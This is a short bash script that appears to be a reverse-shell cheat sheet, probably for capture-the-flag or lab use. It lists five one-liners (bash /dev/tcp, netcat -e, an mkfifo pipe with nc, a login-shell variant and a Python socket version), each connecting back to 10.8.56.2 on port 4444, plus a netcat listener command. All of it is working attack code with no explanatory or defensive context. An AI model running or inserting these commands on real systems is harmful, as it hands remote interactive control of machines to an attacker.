#!/bin/bash

#1
/bin/sh -i >& /dev/tcp/10.8.56.2/4444 0>&1

#2
nc 10.8.56.2 4444 -e /bin/sh

#3
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.56.2 4444 > /tmp/f

#4
/bin/sh -l > /dev/tcp/10.8.56.2/4444 0<&1 2>&1

#5 Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
            s.connect(("10.8.56.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \
            os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Listener
nc -vlnp 4444
